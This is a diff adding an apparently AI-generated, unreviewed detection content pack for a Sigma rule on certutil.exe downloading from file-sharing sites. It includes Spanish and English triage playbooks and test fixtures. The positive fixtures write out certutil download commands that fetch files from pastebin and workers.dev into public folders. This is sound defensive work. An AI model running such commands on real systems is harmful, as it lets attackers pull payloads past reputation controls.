@@ -1,0 +1,138 @@
+{
+  "rule": {
+    "id": "42a5f1e7-9603-4f6d-97ae-3f37d130d794",
+    "title": "Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_certutil_download_file_sharing_domains.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_certutil_download_file_sharing_domains.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1027",
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó certutil.exe (o una copia renombrada) con opciones de descarga (urlcache, verifyctl o URL) apuntando a un sitio de intercambio de archivos, paste o hosting público. Suele indicar descarga de herramientas o payloads usando un binario legítimo de Windows.",
+      "what_it_detects": "Eventos de creación de procesos donde Image termina en \\certutil.exe u OriginalFileName es CertUtil.exe, el CommandLine contiene 'urlcache ', 'verifyctl ' o 'URL ' y además incluye un dominio de la lista (pastebin.com, github.com, cdn.discordapp.com, transfer.sh, workers.dev, entre otros).",
+      "why_it_matters": "Certutil es un LOLBin muy abusado para Ingress Tool Transfer (T1105): descarga archivos sin herramientas adicionales y evade controles basados en reputación. Los sitios de intercambio alojan payloads codificados (T1027) que luego se decodifican con certutil -decode.",
+      "triage_steps": [
+        "Revise el CommandLine completo: URL exacta, ruta de destino del archivo y opciones como -split o -f.",
+        "Compare Image con OriginalFileName; un certutil fuera de System32 o renombrado aumenta mucho la sospecha.",
+        "Analice ParentImage y la cadena de procesos: Office, wscript, mshta, powershell o cmd lanzados desde documentos son señales fuertes.",
+        "Identifique el usuario y si la cuenta tiene un motivo de negocio para descargar desde ese dominio.",
+        "Busque el archivo descargado en el disco y en la caché de CryptnetUrlCache; obtenga su hash y consulte reputación.",
+        "Pivotee en el mismo host +/- 15 minutos: certutil -decode, ejecución del archivo descargado, conexiones de red nuevas o persistencia.",
+        "Busque el mismo dominio o URL en logs de proxy/DNS y en otros endpoints de la organización.",
+        "Revise alertas previas para el mismo host y usuario."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos; son poco frecuentes.",
+        "Scripts de administradores o desarrolladores que descargan herramientas desde github.com o raw.githubusercontent.com con certutil por falta de curl.",
+        "Ejercicios autorizados de red team o pruebas de detección (por ejemplo, Atomic Red Team)."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o el responsable del script si la descarga fue legítima antes de actuar.",
+        "Si no está justificada, aísle el endpoint y bloquee el dominio o la URL en proxy y DNS.",
+        "Preserve el archivo descargado y su hash; envíelo a análisis y elimínelo solo después de recolectar evidencia.",
+        "Busque y elimine persistencia o procesos derivados; restablezca credenciales del usuario si hubo ejecución.",
+        "Restaure el equipo a un estado confiable y considere restringir certutil con AppLocker o WDAC."
+      ],
+      "severity_rationale": "Nivel alto porque usar certutil para descargar desde sitios de intercambio públicos rara vez es legítimo y suele preceder a la ejecución de malware."
+    },
+    "en": {
+      "summary": "certutil.exe (or a renamed copy) ran with download options (urlcache, verifyctl or URL) pointing at a public file-sharing, paste or hosting site. This usually means a payload or tool was fetched with a built-in Windows binary.",
+      "what_it_detects": "Process creation events where Image ends with \\certutil.exe or OriginalFileName is CertUtil.exe, CommandLine contains 'urlcache ', 'verifyctl ' or 'URL ', and CommandLine also contains a listed domain such as pastebin.com, github.com, cdn.discordapp.com, transfer.sh or workers.dev.",
+      "why_it_matters": "Certutil is a widely abused LOLBin for Ingress Tool Transfer (T1105), fetching files without extra tools and slipping past reputation controls. File-sharing sites often host encoded payloads (T1027) later decoded with certutil -decode.",
+      "triage_steps": [
+        "Read the full CommandLine: exact URL, output path and flags such as -split or -f.",
+        "Compare Image with OriginalFileName; certutil outside System32 or renamed is a strong indicator.",
+        "Review ParentImage and the process tree: Office, wscript, mshta, powershell or cmd spawned from documents are strong signals.",
+        "Identify the user and whether the account has a business reason to download from that domain.",
+        "Locate the downloaded file on disk and in CryptnetUrlCache; hash it and check reputation.",
+        "Pivot on the same host +/- 15 minutes: certutil -decode, execution of the downloaded file, new network connections or persistence.",
+        "Search proxy/DNS logs and other endpoints for the same domain or URL.",
+        "Check earlier alerts for the same host and user."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives; they are rare.",
+        "Admin or developer scripts pulling tools from github.com or raw.githubusercontent.com with certutil when curl is unavailable.",
+        "Authorized red team exercises or detection tests such as Atomic Red Team."
+      ],
+      "response_steps": [
+        "Confirm with the user or script owner whether the download was legitimate before acting.",
+        "If unjustified, isolate the endpoint and block the domain or URL at proxy and DNS.",
+        "Preserve the downloaded file and hash; submit for analysis and delete only after evidence is collected.",
+        "Hunt for and remove persistence or child processes; reset user credentials if the file executed.",
+        "Restore the host to a trusted state and consider restricting certutil with AppLocker or WDAC."
+      ],
+      "severity_rationale": "High fits because certutil downloads from public file-sharing sites are rarely legitimate and commonly precede malware execution."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "certutil urlcache download from pastebin launched by cmd spawned from Word",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "certutil.exe -urlcache -split -f https://pastebin.com/raw/AbC123xy C:\\Users\\Public\\update.txt",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c certutil.exe -urlcache -split -f https://pastebin.com/raw/AbC123xy C:\\Users\\Public\\update.txt",
+          "CurrentDirectory": "C:\\Users\\jperez\\Documents\\"
+        }
+      },
+      {
+        "description": "Renamed certutil using verifyctl to fetch from a workers.dev host",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Users\\Public\\cu.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "C:\\Users\\Public\\cu.exe -verifyctl -f -split https://files-demo.workers.dev/data.bin",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CurrentDirectory": "C:\\Users\\Public\\"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "certutil retrieving a CRL from the internal PKI server, not a file-sharing domain",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-PKI-01.andes.example.com",
+          "User": "ANDES\\svc_pki",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "certutil.exe -urlcache -split -f http://pki.example.com/crl/AndesRootCA.crl C:\\PKI\\AndesRootCA.crl",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "certutil computing a hash of a file pulled from github.com earlier; no download flag present",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "certutil.exe -hashfile C:\\Tools\\github.com-release\\tool.zip SHA256",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
